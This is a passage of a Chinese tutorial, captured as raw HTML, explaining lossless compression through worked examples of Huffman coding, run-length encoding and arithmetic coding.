data-first-offset="true"><span data-slate-string="true">无损压缩的算法其实有很多，但无论是哪一种，里面都没有多么神奇的把戏，</span></span></span><span 
data-slate-object="text" data-key="567"><span data-slate-leaf="true" data-offset-key="567:0" 
data-first-offset="true"><span class="se-28cbfdab" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">它们的最基本原理都是一致的，就是利用数据的重复性（冗余性）。</span></span></span></span><span data-slate-object="text" 
data-key="568"><span data-slate-leaf="true" data-offset-key="568:0" data-first-offset="true"><span 
data-slate-string="true">在经过某种无损压缩以后，由于数据的重复性已经降下来了，因此再压缩就无法获益了。</span></span></span> </div> 
<h2 class="se-1cdafb61" data-slate-type="heading" data-slate-object="block" data-key="569"><span 
data-slate-object="text" data-key="570"><span data-slate-leaf="true" data-offset-key="570:0" 
data-first-offset="true"><span data-slate-string="true">哈夫曼编码</span></span></span></h2> <div 
class="se-88175b5b " data-slate-type="paragraph" data-slate-object="block" data-key="571"> 
<span data-slate-object="text" data-key="572"><span data-slate-leaf="true" data-offset-key="572:0" 
data-first-offset="true"><span data-slate-string="true">不管是在哪一本系统介绍压缩算法的书中，那么多的无损压缩算法，哈夫曼编码（Huffman 
Coding）基本都是需要我们最先接触学习的那一个。哈夫曼编码从原理上看，它会根据字符的出现频率，来决定使用怎样的编码方式，并且是</span></span></span><span 
data-slate-object="text" data-key="573"><span data-slate-leaf="true" data-offset-key="573:0" 
data-first-offset="true"><span class="se-f525b37c" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">变长编码</span></span></span></span><span data-slate-object="text" data-key="574"><span 
data-slate-leaf="true" data-offset-key="574:0" data-first-offset="true"><span data-slate-string="true">的一种。相应地，程序员熟悉的 
ASCII 码，就是</span></span></span><span data-slate-object="text" data-key="575"><span data-slate-leaf="true" 
data-offset-key="575:0" data-first-offset="true"><span class="se-1e126610" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">定长编码</span></span></span></span><span 
data-slate-object="text" data-key="576"><span data-slate-leaf="true" data-offset-key="576:0" 
data-first-offset="true"><span data-slate-string="true">，因为总共就 128 个字符，不管是哪一个字符，占用的长度都是一样的。</span></span></span> 
</div> <div class="se-1613c089 " data-slate-type="paragraph" data-slate-object="block" data-key="577"> 
<span data-slate-object="text" data-key="578"><span data-slate-leaf="true" data-offset-key="578:0" 
data-first-offset="true"><span data-slate-string="true">下面我们来看一下哈夫曼编码的大致过程：</span></span></span> 
</div> <div class="se-7afabc85 " data-slate-type="paragraph" data-slate-object="block" data-key="579"> 
<span data-slate-object="text" data-key="580"><span data-slate-leaf="true" data-offset-key="580:0" 
data-first-offset="true"><span data-slate-string="true">首先，统计被加密数据中每个字符出现的频率，把它们从高到低排好。比如下面这个表，就是某一段文字的字母出现的次数统计表格，你可以看到这些字母出现的次数是从左到右依次增加的：</span></span></span> 
</div> <div class="se-bacd0439" data-slate-type="image" data-slate-object="block" data-key="581"> 
<img class="se-0dbc6322" src="https://static001.geekbang.org/resource/image/b9/2a/b9cd13863209a33f45974a72f306102a.jpg"> 
</div> <div class="se-0eb3db54 " data-slate-type="paragraph" data-slate-object="block" data-key="582"> 
<span data-slate-object="text" data-key="583"><span data-slate-leaf="true" data-offset-key="583:0" 
data-first-offset="true"><span data-slate-string="true">接下去，我们就可以从表格的左侧开始取数据，并自下而上地构造哈夫曼树了。</span></span></span> 
</div> <div class="se-74bf0277 " data-slate-type="paragraph" data-slate-object="block" data-key="584"> 
<span data-slate-object="text" data-key="585"><span data-slate-leaf="true" data-offset-key="585:0" 
data-first-offset="true"><span data-slate-string="true">我们</span></span></span><span data-slate-object="text" 
data-key="586"><span data-slate-leaf="true" data-offset-key="586:0" data-first-offset="true"><span 
class="se-bce208fa" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">每次只考虑表格中“出现次数”最少的两列</span></span></span></span><span 
data-slate-object="text" data-key="587"><span data-slate-leaf="true" data-offset-key="587:0" 
data-first-offset="true"><span data-slate-string="true">。第一次，我们发现出现次数最少的是字母 h，其次是 f，因此分别构造最底层的两个叶子节点 
h 和 f，并将它们的和 5 + 6 = 11 也求出来，构造成为它们的父节点：</span></span></span> </div> <div class="se-393b9dbb" 
data-slate-type="image" data-slate-object="block" data-key="588"> <img class="se-7d986914" 
src="https://static001.geekbang.org/resource/image/07/25/07ced87b093b15a37a53eec5c11f9525.jpg"> 
</div> <div class="se-fceece2c " data-slate-type="paragraph" data-slate-object="block" data-key="589"> 
<span data-slate-object="text" data-key="590"><span data-slate-leaf="true" data-offset-key="590:0" 
data-first-offset="true"><span data-slate-string="true">同时，我们更新这个统计表格，使用这个父节点去代替它原本的两个节点 h 
和 f，依然保持各列按照出现次数递增排列：</span></span></span> </div> <div class="se-6f63ebd4" data-slate-type="image" 
data-slate-object="block" data-key="591"> <img class="se-874759a7" src="https://static001.geekbang.org/resource/image/bb/c4/bb6ba23b7599906e0947ce3c11c93ac4.jpg"> 
</div> <div class="se-b2b44f01 " data-slate-type="paragraph" data-slate-object="block" data-key="592"> 
<span data-slate-object="text" data-key="593"><span data-slate-leaf="true" data-offset-key="593:0" 
data-first-offset="true"><span data-slate-string="true">继续按照上面的操作，现在值最小的两个节点，分别为 7 和 8，因此现在这张图变成了：</span></span></span> 
</div> <div class="se-9830d8e3" data-slate-type="image" data-slate-object="block" data-key="594"> 
<img class="se-0cc6443d" src="https://static001.geekbang.org/resource/image/9e/23/9e960cccbc377d2aa78de0d1b0261523.jpg"> 
</div> <div class="se-1264cf53 " data-slate-type="paragraph" data-slate-object="block" data-key="595"> 
<span data-slate-object="text" data-key="596"><span data-slate-leaf="true" data-offset-key="596:0" 
data-first-offset="true"><span data-slate-string="true">而表格变成了：</span></span></span> </div> 
<div class="se-77d60ad5" data-slate-type="image" data-slate-object="block" data-key="597"> 
<img class="se-ac54e4fa" src="https://static001.geekbang.org/resource/image/50/78/5030c305d3ec507e98fc9ef2837c7a78.jpg"> 
</div> <div class="se-5eefb000 " data-slate-type="paragraph" data-slate-object="block" data-key="598"> 
<span data-slate-object="text" data-key="599"><span data-slate-leaf="true" data-offset-key="599:0" 
data-first-offset="true"><span data-slate-string="true">继续，现在值最小的两个节点，分别对应 11 和 15：</span></span></span> 
</div> <div class="se-730daf36" data-slate-type="image" data-slate-object="block" data-key="600"> 
<img class="se-ee01dd57" src="https://static001.geekbang.org/resource/image/e9/19/e9bddf90bba68e53fd05f7ba360be419.jpg"> 
</div> <div class="se-f525d9b5 " data-slate-type="paragraph" data-slate-object="block" data-key="601"> 
<span data-slate-object="text" data-key="602"><span data-slate-leaf="true" data-offset-key="602:0" 
data-first-offset="true"><span data-slate-string="true">表格变成了：</span></span></span> </div> 
<div class="se-6028846f" data-slate-type="image" data-slate-object="block" data-key="603"> 
<img class="se-bedd5666" src="https://static001.geekbang.org/resource/image/e8/fa/e81b887b2257301b0550a8287108effa.jpg"> 
</div> <div class="se-a9a246d8 " data-slate-type="paragraph" data-slate-object="block" data-key="604"> 
<span data-slate-object="text" data-key="605"><span data-slate-leaf="true" data-offset-key="605:0" 
data-first-offset="true"><span data-slate-string="true">继续：</span></span></span> </div> <div 
class="se-ae7dc97a" data-slate-type="image" data-slate-object="block" data-key="606"> <img 
class="se-cd93723f" src="https://static001.geekbang.org/resource/image/a5/6d/a570c424cfeb2c166b9b946ff43cba6d.jpg"> 
</div> <div class="se-8ea75479 " data-slate-type="paragraph" data-slate-object="block" data-key="607"> 
<span data-slate-object="text" data-key="608"><span data-slate-leaf="true" data-offset-key="608:0" 
data-first-offset="true"><span data-slate-string="true">表格只有两列数据了：</span></span></span> </div> 
<div class="se-0032bf0e" data-slate-type="image" data-slate-object="block" data-key="609"> 
<img class="se-e20f7146" src="https://static001.geekbang.org/resource/image/20/65/2065dc12222e465cd65e46b31ec6f865.jpg"> 
</div> <div class="se-111d0ae9 " data-slate-type="paragraph" data-slate-object="block" data-key="610"> 
<span data-slate-object="text" data-key="611"><span data-slate-leaf="true" data-offset-key="611:0" 
data-first-offset="true"><span data-slate-string="true">好，这棵树构造完成，这时候表格里只剩下一列了，即 e+a+h+f+t+d=76，我就不列出来了。在树构造完成后，我们给图中所有的左分支赋值 
0，右分支赋值 1：</span></span></span> </div> <div class="se-ebaa6f60" data-slate-type="image" data-slate-object="block" 
data-key="612"> <img class="se-8a4b073b" src="https://static001.geekbang.org/resource/image/23/62/235d7ec15ea7a20981b0283d329c5362.jpg"> 
</div> <div class="se-07ceb242 " data-slate-type="paragraph" data-slate-object="block" data-key="613"> 
<span data-slate-object="text" data-key="614"><span data-slate-leaf="true" data-offset-key="614:0" 
data-first-offset="true"><span data-slate-string="true">这就是哈夫曼树。</span></span></span> </div> 
<div class="se-03c55c19 " data-slate-type="paragraph" data-slate-object="block" data-key="615"> 
<span data-slate-object="text" data-key="616"><span data-slate-leaf="true" data-offset-key="616:0" 
data-first-offset="true"><span data-slate-string="true">你可以看到，每一个叶子节点，都代表了我们希望加密的字符。</span></span></span><span 
data-slate-object="text" data-key="617"><span data-slate-leaf="true" data-offset-key="617:0" 
data-first-offset="true"><span class="se-9a5c0be1" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">只要从根部开始，往叶子节点的方向按照最短路径的方式遍历（图中箭头的逆向），每一条路径都对应了实际的哈夫曼编码。</span></span></span></span><span 
data-slate-object="text" data-key="618"><span data-slate-leaf="true" data-offset-key="618:0" 
data-first-offset="true"><span data-slate-string="true">按照这个规则，让我们给最开始的那个记录字符出现次数的表格加上一行：</span></span></span> 
</div> <div class="se-4088da1f" data-slate-type="image" data-slate-object="block" data-key="619"> 
<img class="se-c7b7514b" src="https://static001.geekbang.org/resource/image/75/77/75437d2a1157a36eba5f81c57c88c077.jpg"> 
</div> <div class="se-b7457751 " data-slate-type="paragraph" data-slate-object="block" data-key="620"> 
<span data-slate-object="text" data-key="621"><span data-slate-leaf="true" data-offset-key="621:0" 
data-first-offset="true"><span data-slate-string="true">你可以看到，大致的规律是，出现频率越高的字符，编码串的长度就越短。如果有一个单词 
date，它的编码就是：</span></span></span> </div> <div class="se-815a6fd8" data-slate-type="image" data-slate-object="block" 
data-key="622"> <img class="se-b97dd0fa" src="https://static001.geekbang.org/resource/image/b3/08/b3e14ecf2d8c67845f8bad9763be8c08.jpg"> 
</div> <div class="se-96f8c5e7 " data-slate-type="paragraph" data-slate-object="block" data-key="623"> 
<span data-slate-object="text" data-key="624"><span data-slate-leaf="true" data-offset-key="624:0" 
data-first-offset="true"><span data-slate-string="true">这就是哈夫曼编码的原理，但是由于哈夫曼编码是变长的，</span></span></span><span 
data-slate-object="text" data-key="625"><span data-slate-leaf="true" data-offset-key="625:0" 
data-first-offset="true"><span class="se-52fac391" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">为了解码端能够准确地解码，就需要编码端同时附上字母到编码的映射关系表</span></span></span></span><span 
data-slate-object="text" data-key="626"><span data-slate-leaf="true" data-offset-key="626:0" 
data-first-offset="true"><span data-slate-string="true">（就是上面那个表格，出现次数一行可以删掉，剩下两行保留），也就是所谓的“编码表”。</span></span></span> 
</div> <h2 class="se-d6030148" data-slate-type="heading" data-slate-object="block" data-key="627"><span 
data-slate-object="text" data-key="628"><span data-slate-leaf="true" data-offset-key="628:0" 
data-first-offset="true"><span data-slate-string="true">RLE 编码</span></span></span></h2> <div 
class="se-0278f466 " data-slate-type="paragraph" data-slate-object="block" data-key="629"> 
<span data-slate-object="text" data-key="630"><span data-slate-leaf="true" data-offset-key="630:0" 
data-first-offset="true"><span data-slate-string="true">RLE 编码，即 Run-Length Encoding，是一种原理非常简单的压缩编码方式，它利用的就是字符的“简单重复”。并且有意思的是，这种编码方式和很多其它压缩编码方式不冲突，也就是说，</span></span></span><span 
data-slate-object="text" data-key="631"><span data-slate-leaf="true" data-offset-key="631:0" 
data-first-offset="true"><span class="se-5dc6d49e" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">数据可以以特定的方式经过 RLE 编码后，再使用哈夫曼等其它方式进一步压缩编码</span></span></span></span><span 
data-slate-object="text" data-key="632"><span data-slate-leaf="true" data-offset-key="632:0" 
data-first-offset="true"><span data-slate-string="true">。</span></span></span> </div> <div 
class="se-8fcdeaaa " data-slate-type="paragraph" data-slate-object="block" data-key="633"> 
<span data-slate-object="text" data-key="634"><span data-slate-leaf="true" data-offset-key="634:0" 
data-first-offset="true"><span data-slate-string="true">举个例子，如果有这样一段单个字符重复率比较高的原串：</span></span></span> 
</div> <div class="se-fc72288f se-5fc72052" data-slate-type="pre" data-slate-object="block" 
data-key="635"> <div class="se-e71945b9 se-566ad990"> <span></span> </div> <div class="se-082e7343"> 
<div class="se-907e558b se-97be4980" data-code-line-number="1"></div> </div> <div class="se-fcf6a9e1 
ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="636"> <span data-slate-object="text" data-key="637"><span data-slate-leaf="true" 
data-offset-key="637:0" data-first-offset="true"><span data-slate-string="true">AAAAABBCDDDDDDD</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-854614a5 " data-slate-type="paragraph" data-slate-object="block" data-key="638"> 
<span data-slate-object="text" data-key="639"><span data-slate-leaf="true" data-offset-key="639:0" 
data-first-offset="true"><span data-slate-string="true">它就可以使用 RLE 的方式编码成：</span></span></span> 
</div> <div class="se-645c8bc6 se-12e11061" data-slate-type="pre" data-slate-object="block" 
data-key="640"> <div class="se-23f82d5c se-84d58997"> <span></span> </div> <div class="se-84f62f17"> 
<div class="se-4473d8f4 se-f93eb7e4" data-code-line-number="1"></div> </div> <div class="se-dfdb5de6 
ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="641"> <span data-slate-object="text" data-key="642"><span data-slate-leaf="true" 
data-offset-key="642:0" data-first-offset="true"><span data-slate-string="true">5A2B1C7D</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-a427bcd3 " data-slate-type="paragraph" data-slate-object="block" data-key="643"> 
<span data-slate-object="text" data-key="644"><span data-slate-leaf="true" data-offset-key="644:0" 
data-first-offset="true"><span data-slate-string="true">这表示这段原数据中有 5 个连续的 A，2 个连续的 B，1 个 C 
和 7 个连续的 D。</span></span></span> </div> <div class="se-f9270ab8 " data-slate-type="paragraph" 
data-slate-object="block" data-key="645"> <span data-slate-object="text" data-key="646"><span 
data-slate-leaf="true" data-offset-key="646:0" data-first-offset="true"><span data-slate-string="true">这种方式下，不知你是否想到，也可能存在问题。比如说，如果连续字符重复的比率很低，像是这样一段字符：</span></span></span> 
</div> <div class="se-b2e25f60 se-779858f2" data-slate-type="pre" data-slate-object="block" 
data-key="647"> <div class="se-09cc1905 se-9a5d8d22"> <span></span> </div> <div class="se-54b6894b"> 
<div class="se-bf54310e se-da9bdcab" data-code-line-number="1"></div> </div> <div class="se-253503bc 
ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="648"> <span data-slate-object="text" data-key="649"><span data-slate-leaf="true" 
data-offset-key="649:0" data-first-offset="true"><span data-slate-string="true">ABCDABCD</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-56118c46 " data-slate-type="paragraph" data-slate-object="block" data-key="650"> 
<span data-slate-object="text" data-key="651"><span data-slate-leaf="true" data-offset-key="651:0" 
data-first-offset="true"><span data-slate-string="true">按照刚才的规则，它就会被编码成：</span></span></span> 
</div> <div class="se-fd9ac9c6 se-e6a976c3" data-slate-type="pre" data-slate-object="block" 
data-key="652"> <div class="se-36e26c53 se-48c90d92"> <span></span> </div> <div class="se-951355f6"> 
<div class="se-08d5ea39 se-6c6d2694" data-code-line-number="1"></div> </div> <div class="se-7061cf7a 
ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="653"> <span data-slate-object="text" data-key="654"><span data-slate-leaf="true" 
data-offset-key="654:0" data-first-offset="true"><span data-slate-string="true">1A1B1C1D1A1B1C1D</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-5fa1ba95 " data-slate-type="paragraph" data-slate-object="block" data-key="655"> 
<span data-slate-object="text" data-key="656"><span data-slate-leaf="true" data-offset-key="656:0" 
data-first-offset="true"><span data-slate-string="true">什么嘛，编码后居然比原字符串还长！</span></span></span> 
</div> <div class="se-cba85f17 " data-slate-type="paragraph" data-slate-object="block" data-key="657"> 
<span data-slate-object="text" data-key="658"><span data-slate-leaf="true" data-offset-key="658:0" 
data-first-offset="true"><span class="se-0948c45c" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">因此，RLE 这种压缩编码方式，更适合于连续字符发生率较高的数据。</span></span></span></span><span 
data-slate-object="text" data-key="659"><span data-slate-leaf="true" data-offset-key="659:0" 
data-first-offset="true"><span data-slate-string="true">比方说黑白的栅格图像（关于栅格图像的概念，你可以参考 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="660" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="661"><span data-slate-leaf="true" data-offset-key="661:0" 
data-first-offset="true"><span data-slate-string="true">[第 18 讲]</span></span></span></a><span 
data-slate-object="text" data-key="662"><span data-slate-leaf="true" data-offset-key="662:0" 
data-first-offset="true"><span data-slate-string="true">），里面往往存在着大片大片的重复字符。</span></span></span> 
</div> <h2 class="se-22902359" data-slate-type="heading" data-slate-object="block" data-key="663"><span 
data-slate-object="text" data-key="664"><span data-slate-leaf="true" data-offset-key="664:0" 
data-first-offset="true"><span data-slate-string="true">算术编码</span></span></span></h2> <div 
class="se-3cb5df4f " data-slate-type="paragraph" data-slate-object="block" data-key="665"> 
<span data-slate-object="text" data-key="666"><span data-slate-leaf="true" data-offset-key="666:0" 
data-first-offset="true"><span data-slate-string="true">算术编码，即 Arithmetic Coding，我们可以拿它和哈夫曼编码比较起来看：二者都会根据字符的出现频率来设定编码规则，但哈夫曼编码针对的单位是单个字符，每个字符对应一个数；而算术编码，则是整个消息串（编码单元）编码成一个数。</span></span></span> 
</div> <div class="se-411a7339 " data-slate-type="paragraph" data-slate-object="block" data-key="667"> 
<span data-slate-object="text" data-key="668"><span data-slate-leaf="true" data-offset-key="668:0" 
data-first-offset="true"><span data-slate-string="true">举个例子，某数据可能由四个字母组成，每个字母出现的概率如下：</span></span></span> 
</div> <div class="se-bcc86424" data-slate-type="image" data-slate-object="block" data-key="669"> 
<img class="se-ebe9d356" src="https://static001.geekbang.org/resource/image/2c/a2/2c0eb01a4b13fc3fd7e3f49da3ecd6a2.jpg"> 
</div> <div class="se-85dbaee7 " data-slate-type="paragraph" data-slate-object="block" data-key="670"> 
<span data-slate-object="text" data-key="671"><span data-slate-leaf="true" data-offset-key="671:0" 
data-first-offset="true"><span data-slate-string="true">根据上面的统计，假如说现在我们要给单词 eat 来进行算术编码。</span></span></span> 
</div> <div class="se-c8cfd10a " data-slate-type="paragraph" data-slate-object="block" data-key="672"> 
<span data-slate-object="text" data-key="673"><span data-slate-leaf="true" data-offset-key="673:0" 
data-first-offset="true"><span data-slate-string="true">第一步：我们先把 0 到 1 的范围按照该比例划分成这样 4 个区域，第一个字母 
e 就在从 60% 到 100% 的位置（每一个区域，都是左闭右开的区间，比如 t 的区间是 [0, 10%)）。</span></span></span> </div> <div 
class="se-32f8cf94" data-slate-type="image" data-slate-object="block" data-key="674"> <img 
class="se-23b994df" src="https://static001.geekbang.org/resource/image/e4/48/e417f178a506359ae9db6ebfbdb9d548.jpg"> 
</div> <div class="se-65e7ddf1 " data-slate-type="paragraph" data-slate-object="block" data-key="675"> 
<span data-slate-object="text" data-key="676"><span data-slate-leaf="true" data-offset-key="676:0" 
data-first-offset="true"><span data-slate-string="true">第二步：接下来是字母 a，我们把上面 e 这个区域，即 [60%, 100%)，按照同样的比例划分成 
4 个区域，根据同样的计算，a 的位置在 72% 到 84% 这一段上。</span></span></span> </div> <div class="se-e4bbf59d" data-slate-type="image" 
data-slate-object="block" data-key="677"> <img class="se-9c5e6cbb" src="https://static001.geekbang.org/resource/image/b8/e6/b8638c5efae09d9fe98d11bc79e169e6.jpg"> 
</div> <div class="se-5a3a1cff " data-slate-type="paragraph" data-slate-object="block" data-key="678"> 
<span data-slate-object="text" data-key="679"><span data-slate-leaf="true" data-offset-key="679:0" 
data-first-offset="true"><span data-slate-string="true">第三步：最后是字母 t，做法也依然如此，把上面 a 这个区域按照同一比例划分成 
4 个 区域，t 的位置在 72% 到 73.2% 这一段区域内。</span></span></span> </div> <div class="se-12362bc1" data-slate-type="image" 
data-slate-object="block" data-key="680"> <img class="se-e806b4c8" src="https://static001.geekbang.org/resource/image/30/bc/30e8587b0176b4f0f92677585ddaf6bc.jpg"> 
</div> <div class="se-00d4082f " data-slate-type="paragraph" data-slate-object="block" data-key="681"> 
<span data-slate-object="text" data-key="682"><span data-slate-leaf="true" data-offset-key="682:0" 
data-first-offset="true"><span data-slate-string="true">那么，我们就可以给它取 73%，因为它就在最后的区域 t 内，当然，在编码中我们可以去掉百分号。因此，基于上面的统计，eat 
这个单词，就可以采用算术编码成数值 73。也就是说，通过这种方法，</span></span></span><span data-slate-object="text" data-key="683"><span 
data-slate-leaf="true" data-offset-key="683:0" data-first-offset="true"><span class="se-a77afa57" 
data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">一段编码前的数据，最后编码成了一个数。</span></span></span></span> 
</div> <div class="se-05cef60d " data-slate-type="paragraph" data-slate-object="block" data-key="684"> 
<span data-slate-object="text" data-key="685"><span data-slate-leaf="true" data-offset-key="685:0" 
data-first-offset="true"><span data-slate-string="true">这就是算术编码的大致原理，根据已知的统计，将给定数据段进行划分，原则就是让出现概率较大的字符根据比例来分配到相对更大的数据段，解码方根据编码方提供的这一依赖统计数据，就可以做出准确的解码。</span></span></span> 
</div> <div class="se-3c6ee46e " data-slate-type="paragraph" data-slate-object="block" data-key="686"> 
<span data-slate-object="text" data-key="687"><span data-slate-leaf="true" data-offset-key="687:0" 
data-first-offset="true"><span data-slate-string="true">当然，上面作为一个示例，是做了相当的简化了的，在实际应用中，还有很多因素需要我们考虑，比如：</span></span></span> 
</div> <div class="se-2ef2eaab " data-slate-type="paragraph" data-slate-object="block" data-key="688"> 
<span data-slate-object="text" data-key="689"><span data-slate-leaf="true" data-offset-key="689:0" 
data-first-offset="true"><span class="se-e52a22f3" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">1. 采用二进制来代替十进制</span></span></span></span> </div> <div class="se-a934983a 
" data-slate-type="paragraph" data-slate-object="block" data-key="690"> <span data-slate-object="text" 
data-key="691"><span data-slate-leaf="true" data-offset-key="691:0" data-first-offset="true"><span 
data-slate-string="true">我们使用十进制，仅仅是示例之用，为了便于让你理解。实际上，使用二进制可以减小“浪费”的字符，从而缩短编码后的长度，提高压缩比。我们还是拿上面的那个例子来说，72% 
和 73% 在数值位数长度相同的情况下都可以表示 eat 这个词，这就是一定程度上的浪费。</span></span></span><span data-slate-object="text" 
data-key="692"><span data-slate-leaf="true" data-offset-key="692:0" data-first-offset="true"><span 
class="se-88f1576b" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">最理想的状况，应当是用于压缩后数据表达的数值，可以按照比例“恰好”地去覆盖所有被编码的数据组合——而不存在某一种表达是冗余的，或者说对应的被编码的实际数据组合不存在。</span></span></span></span> 
</div> <div class="se-9fc4d6ea " data-slate-type="paragraph" data-slate-object="block" data-key="693"> 
<span data-slate-object="text" data-key="694"><span data-slate-leaf="true" data-offset-key="694:0" 
data-first-offset="true"><span class="se-c881e5b4" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">2. 引入结束字符</span></span></span></span> </div> <div class="se-a366c9d6 
" data-slate-type="paragraph" data-slate-object="block" data-key="695"> <span data-slate-object="text" 
data-key="696"><span data-slate-leaf="true" data-offset-key="696:0" data-first-offset="true"><span 
data-slate-string="true">通常我们不会把整个输入完全使用一个编码数值来表示，而是将输入根据某种规则划分成若干个部分，分别采用算术编码处理。比如一段英文文字，就可以使用空格来标识每一个单词的结束，因此像空格这样的“结束符”需要考虑到编码字符内。</span></span></span> 
</div> <div class="se-5f659bcc " data-slate-type="paragraph" data-slate-object="block" data-key="697"> 
<span data-slate-object="text" data-key="698"><span data-slate-leaf="true" data-offset-key="698:0" 
data-first-offset="true"><span class="se-99a5e53d" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">3. 适当考虑条件概率</span></span></span></span> </div> <div class="se-42536afe 
" data-slate-type="paragraph" data-slate-object="block" data-key="699"> <span data-slate-object="text" 
data-key="700"><span data-slate-leaf="true" data-offset-key="700:0" data-first-offset="true"><span 
data-slate-string="true">你看，上面例子中的第一步、第二步和第三步，t、d、a、e 的分布都是一样的，但是实际上，这个分布在“前一个”字母确定的情况下，是可以有变化的。举个例子，前面提到的字母概率分布，在“前一个字母为 
t”的前提下，当前字母的概率遵循如下表格：</span></span></span> </div> <div class="se-0111eff7" data-slate-type="image" 
data-slate-object="block" data-key="701"> <img class="se-d0840c40" src="https://static001.geekbang.org/resource/image/0a/55/0aa89490dad355f80853db5f3c884f55.jpg"> 
</div> <div class="se-7f61f5b8 " data-slate-type="paragraph" data-slate-object="block" data-key="702"> 
<span data-slate-object="text" data-key="703"><span data-slate-leaf="true" data-offset-key="703:0" 
data-first-offset="true"><span data-slate-string="true">你可以看到，这个条件下的统计和前文比，发生了明显的变化，我们说它是“1 
级”条件概率。如果我们讨论，在前两个字母分别是 t 和 e 的前提下，接着看第三个字母的概率分布，这时的条件概率其实就到“2 级”了。</span></span></span> </div> 
<div class="se-dfee5cba " data-slate-type="paragraph" data-slate-object="block" data-key="704"> 
<span data-slate-object="text" data-key="705"><span data-slate-leaf="true" data-offset-key="705:0" 
data-first-offset="true"><span data-slate-string="true">你也可以想象，由于排列组合的关系，我们不可能无限地考虑条件概率，考虑 
n 级条件概率，这个编码表的大小就是最初编码表大小的 n 次方，因此条件概率的选择，</span></span></span><span data-slate-object="text" 
data-key="706"><span data-slate-leaf="true" data-offset-key="706:0" data-first-offset="true"><span 
class="se-61fe6aa9" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">我们要么选择某几个特定字母（规则）的条件概率</span></span></span></span><span 
data-slate-object="text" data-key="707"><span data-slate-leaf="true" data-offset-key="707:0" 
data-first-offset="true"><span data-slate-string="true">，比如我们只考虑字母 t 和字母 d 的条件概率；</span></span></span><span 
data-slate-object="text" data-key="708"><span data-slate-leaf="true" data-offset-key="708:0" 
data-first-offset="true"><span class="se-4f6300f7" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">要么严格限制条件概率的级数</span></span></span></span><span data-slate-object="text" 
data-key="709"><span data-slate-leaf="true" data-offset-key="709:0" data-first-offset="true"><span 
data-slate-string="true">，比如就实现 1 或 2 级的条件概率。</span></span></span> </div> <div class="se-a19ce7a7 
" data-slate-type="paragraph" data-slate-object="block" data-key="710"> <span data-slate-object="text" 
data-key="711"><span data-slate-leaf="true" data-offset-key="711:0" data-first-offset="true"><span 
class="se-0dc30e55" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">4. 
将静态模型改进为自适应模型</span></span></span></span> </div> <div class="se-791e3146 " data-slate-type="paragraph" 
data-slate-object="block" data-key="712"> <span data-slate-object="text" data-key="713"><span 
data-slate-leaf="true" data-offset-key="713:0" data-first-offset="true"><span data-slate-string="true">算术编码需要在统计数据的指导下进行，我们当然希望统计数据可以精确。我们的例子中，统计信息是预先确定的，即什么字母的出现概率是百分之几都是已经知道的。也就是说，我们应用的是“静态模型”，对于静态模型来说，我们可以相对容易地追求最佳的压缩比。</span></span></span> 
</div> <div class="se-4966b438 " data-slate-type="paragraph" data-slate-object="block" data-key="714"> 
<span data-slate-object="text" data-key="715"><span data-slate-leaf="true" data-offset-key="715:0" 
data-first-offset="true"><span data-slate-string="true">但是在实际应用中，很多时候我们是不知道这个的，或者说，即便知道，这个值也是在不断变化的。使用静态模型的问题也就在这里，</span></span></span><span 
data-slate-object="text" data-key="716"><span data-slate-leaf="true" data-offset-key="716:0" 
data-first-offset="true"><span class="se-184f7776" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">如果用一个静态的统计去指导一个动态变化的问题，就像刻舟求剑一样，哪怕一开始编码是高效的，很快这个压缩率就降下来了。</span></span></span></span> 
</div> <div class="se-e225a1d8 " data-slate-type="paragraph" data-slate-object="block" data-key="717"> 
<span data-slate-object="text" data-key="718"><span data-slate-leaf="true" data-offset-key="718:0" 
data-first-offset="true"><span data-slate-string="true">因此我们经常需要把静态模型变成自适应模型。如果还是前面那个例子显示的四个字母，假如说在一开始的时候 
